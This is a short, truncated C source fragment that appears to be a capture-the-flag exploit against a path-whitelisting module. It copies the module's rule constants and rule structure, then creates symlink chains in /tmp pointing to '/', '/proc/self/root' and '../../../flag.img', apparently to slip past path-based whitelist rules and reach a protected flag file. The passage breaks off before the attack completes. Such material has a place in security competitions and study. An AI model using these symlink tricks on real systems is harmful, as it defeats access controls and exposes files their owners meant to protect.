#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <linux/limits.h>

// Based on the whitelist module code
#define LDW_RULE_FILT_MODE    0x00000007
#define LDW_RULE_MODE_UNCOND  0x00000000
#define LDW_RULE_MODE_PREFIX  0x00000001
#define LDW_RULE_MODE_MATCH   0x00000002
#define LDW_RULE_MODE_PREFDIR 0x00000003
#define LDW_RULE_MODE_SUFFIX  0x00000004

#define LDW_RULE_FILT_USER    0x00000008
#define LDW_RULE_FILT_GROUP   0x00000010
#define LDW_RULE_FILT_PERMIT  0x00000020
#define LDW_RULE_FILT_MASK    0x0000003F

struct ldw_rule_user {
    size_t size;
    int filt_mode;
    uid_t tgtUser;
    gid_t tgtGroup;
    char name[0];
};

int main() {
    // Create our symlink chain
    system("mkdir -p /tmp/a");
    system("mkdir -p /tmp/b");
    system("mkdir -p /tmp/c");

    // Create symlinks with varying depths
    symlink("/", "/tmp/a/root");
    symlink("/proc/self/root", "/tmp/b/root");
    symlink("../../../flag.img", "/tmp/c/flag");

